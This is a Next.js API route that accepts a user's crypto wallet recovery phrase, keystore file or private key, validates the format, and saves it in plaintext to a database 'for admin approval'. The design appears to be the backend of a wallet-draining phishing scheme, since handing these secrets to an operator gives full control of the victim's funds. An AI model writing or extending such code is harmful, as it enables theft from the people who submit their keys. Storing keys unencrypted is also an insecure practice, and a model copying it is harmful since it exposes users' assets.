import { NextRequest, NextResponse } from "next/server";
import { getServerSession } from "next-auth";
import { authOptions } from "@/lib/authOptions";
import connectDB  from "@/lib/mongodb";
import Wallet from "@/models/Wallet";
import User from "@/models/User";

interface WalletSubmitRequest {
  type: "phrase" | "keystore" | "private";
  data: string;
  walletName: string;
}

interface WalletSubmitResponse {
  success: boolean;
  error?: string;
  walletId?: string;
  message?: string;
}

export async function POST(req: NextRequest) {
  try {
    const session = await getServerSession(authOptions);

    if (!session || !session.user?.email) {
      return NextResponse.json(
        { success: false, error: "Unauthorized" },
        { status: 401 }
      );
    }

    await connectDB();

    // Get user
    const user = await User.findOne({
      email: session.user.email,
    });

    if (!user) {
      return NextResponse.json(
        { success: false, error: "User not found" },
        { status: 404 }
      );
    }

    const { type, data, walletName }: WalletSubmitRequest = await req.json();

    if (!type || !data || !walletName) {
      return NextResponse.json(
        {
          success: false,
          error: "Missing required fields: type, data, walletName",
        },
        { status: 400 }
      );
    }

    // Check if user already has a pending or approved wallet
    const existingWallet = await Wallet.findOne({
      userId: user._id,
      status: { $in: ["pending", "approved"] },
    });

    if (existingWallet) {
      return NextResponse.json(
        {
          success: false,
          error: "You already have a pending or approved wallet",
        },
        { status: 400 }
      );
    }

    // Validate based on type
    if (type === "phrase") {
      const words = data.trim().split(/\s+/);
      if (words.length !== 12 && words.length !== 24) {
        return NextResponse.json(
          {
            success: false,
            error: "Recovery phrase must be exactly 12 or 24 words",
          },
          { status: 400 }
        );
      }
    } else if (type === "keystore") {
      try {
        JSON.parse(data);
      } catch {
        return NextResponse.json(
          { success: false, error: "Invalid JSON format for keystore" },
          { status: 400 }
        );
      }
    } else if (type === "private") {
      if (!/^(0x)?[a-fA-F0-9]{64}$/.test(data.trim())) {
        return NextResponse.json(
          {
            success: false,
            error:
              "Invalid private key format. Must be 64 hexadecimal characters",
          },
          { status: 400 }
        );
      }
    } else {
      return NextResponse.json(
        { success: false, error: "Invalid wallet type" },
        { status: 400 }
      );
    }

    // Create wallet record
    const wallet = new Wallet({
      userId: user._id,
      walletName,
      walletType: type,
      status: "pending",
      submittedAt: new Date(),
    });

    if (type === "phrase") {
      wallet.seedPhrase = data;
    } else if (type === "keystore") {
      wallet.keystoreJson = data;
    } else if (type === "private") {
      wallet.privateKey = data;
    }

    await wallet.save();

    return NextResponse.json({
      success: true,
      walletId: wallet._id.toString(),
      message: "Wallet submitted for admin approval",
    });
  } catch (error) {
    console.error("Error submitting wallet:", error);
    return NextResponse.json(
      { success: false, error: "Internal server error" },
      { status: 500 }
    );
  }
}
